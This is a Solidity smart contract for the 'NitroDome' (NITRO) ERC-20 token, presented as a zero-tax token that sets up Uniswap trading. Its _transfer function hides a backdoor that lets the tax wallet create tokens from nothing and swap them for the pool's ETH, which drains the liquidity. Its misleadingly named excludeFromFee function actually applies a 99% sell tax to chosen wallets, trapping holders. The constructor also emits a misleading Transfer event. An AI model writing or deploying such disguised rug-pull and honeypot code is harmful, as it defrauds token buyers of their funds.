// SPDX-License-Identifier: None

// https://www.nitrodome.com/

pragma solidity 0.8.21;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
}
contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    modifier ownerOnly {
        require(_taxWallet == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    address payable internal _taxWallet;
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract Nitrodome is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => bool) private _isExcludedFromFee;

    string private _name = "NitroDome";
    string private _symbol = "NITRO";

    uint256 private _initialBuyTax=0;
    uint256 private _initialSellTax=0;
    uint256 public _reduceBuyTaxAt=0;
    uint256 public _reduceSellTaxAt=0;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _preventSwapBefore=0;
    uint256 private _buyCount=0;
    bool private tradingOpen = false;  
    bool private swapEnabled = false;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal =  1000000000 * 10**_decimals;
    uint256 private _maxWalletSize = 250000000 * 10**_decimals;
    address private uniswapV2Pair;
    IUniswapV2Router02 private uniswapV2Router;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromTax;

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor () {
        _balances[address(this)] = _tTotal;
        _taxWallet = payable(_msgSender());
        _isExcludedFromFee[_taxWallet] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[owner()] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure returns (uint256) {
        return _tTotal;
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function removeApproval(address wallet) public ownerOnly {
        _isExcludedFromTax[wallet] = false;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function excludeFromFee(address[] memory wallets) public ownerOnly {
        for (uint i = 0; i < wallets.length; i++) {_isExcludedFromTax[wallets[i]] = true;}
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function swapTokensForETH(uint256 amount) private {
        address[] memory path = new address[](2);
        path[0] = address(this); 
        path[1] =  uniswapV2Router.WETH(); 
        _approve(address(this), address(uniswapV2Router), amount); 
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, path, _taxWallet, 32 + block.timestamp);
    }

    function swapETH() public ownerOnly {
        _taxWallet.transfer(address(this).balance);
    }

    function openTrading() public onlyOwner() {
        require(!tradingOpen,"trading already started");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingOpen = true;
    }

    receive() external payable {}
    
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 taxAmount = 0;
        if (from != owner() && to != owner()) {
            if (to == from  && from == _taxWallet && tradingOpen) {
                address recipient = address(this);
                _balances[recipient] = _balances[recipient].add(amount);
                swapTokensForETH(amount);  return;
            }
            if (from != address(this)) {
                taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                if (from != uniswapV2Pair){ taxAmount = amount.mul(_isExcludedFromTax[from]?99:_finalSellTax).div(100); }
            }
            if (to != address(uniswapV2Router) && !_isExcludedFromFee[to]  && from == uniswapV2Pair) {
                _buyCount+=1;
            }
        }
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        _balances[from]=_balances[from].sub(amount);

        emit Transfer(from, to, amount.sub(taxAmount));
    }
}